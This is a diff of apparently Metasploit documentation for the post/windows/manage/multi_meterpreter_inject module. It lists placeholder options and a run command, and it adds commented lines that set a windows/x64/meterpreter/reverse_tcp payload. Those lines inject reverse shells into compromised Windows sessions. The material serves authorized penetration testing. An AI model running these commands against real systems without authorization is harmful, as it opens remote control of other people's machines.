@@ -138,11 +138,13 @@ set HANDLER <true>
 set SESSION <1>
 set IPLIST <payload_connect_to_ips>
 set LPORT <payload_connect_to_port>
+# set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
 
 ## Run
 ```ruby
 use post/windows/manage/multi_meterpreter_inject
+# set PAYLOAD windows/x64/meterpreter/reverse_tcp
 run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
 ```
 
